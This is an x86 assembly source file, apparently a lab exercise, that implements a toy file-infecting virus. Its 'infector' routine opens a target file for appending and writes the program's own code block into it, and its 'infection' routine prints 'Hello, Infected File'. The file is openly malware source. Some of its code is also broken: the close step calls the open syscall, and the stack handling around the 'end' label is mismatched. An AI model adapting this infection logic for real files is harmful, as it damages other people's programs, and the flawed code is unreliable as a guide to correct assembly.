segment .data
    str_infection: db "Hello, Infected File"
    new_line: db 10
    end_code:db "VIRUS ATTACHED"
segment .text
    WRITE EQU 4
    STDOUT EQU 1
    global infection
    global infector
    global end
    extern main          
    global _start
    global system_call


_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
infection:
    push    ebp             ; prepare stack frame for main
    mov     ebp, esp

    pushad  
    mov eax, WRITE		;sys_write
	mov ebx, STDOUT		;fd of stdout which is unbuffered
	mov ecx, dword str_infection		;pointer to buffer with data
	mov edx, dword 20		;length of data to be written (20 bytes)
	int 0x80
    popad

    pushad  
    mov eax, WRITE		;sys_write
	mov ebx, STDOUT		;fd of stdout which is unbuffered
	mov ecx, dword new_line		;pointer to buffer with data
	mov edx, dword 1		;length of data to be written (1 bytes)
	int 0x80
    popad
    jmp end


infector:
    push    ebp             ; prepare stack frame for main
    mov     ebp, esp
    sub esp, 4
    pushad 

    ;open the file
    mov eax, 5 
    mov ebx, dword[ebp+8]
    mov ecx, 1089               ;open for appending to the end of file
    int 0x80

    mov [ebp-4], eax  ;get fb returned value

    ;write
    mov eax, 4 
    mov ebx, [ebp-4]
    mov ecx, code_start ; pointer to output buffer
    mov edx, code_end
    sub edx, code_start
    int 0x80

    ;close the file
    mov eax, 5 
    mov ebx, [ebp - 4]
    int 0x80
    popad

end:
    add esp, 4
    mov eax, 0
    mov esp, ebp
    pop ebp
    ret
    
code_end:
